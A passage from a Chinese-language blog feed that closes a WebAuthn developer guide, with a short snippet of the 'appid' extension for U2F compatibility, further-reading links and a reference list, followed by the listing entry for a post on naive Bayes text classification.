流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\n    appid: \"https://example.com\" //U2F appid\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。 ——我瞎编的 为什么这篇文章的标题是 NLP  […]","link":"https://flyhigher.top/develop/1989.html"}]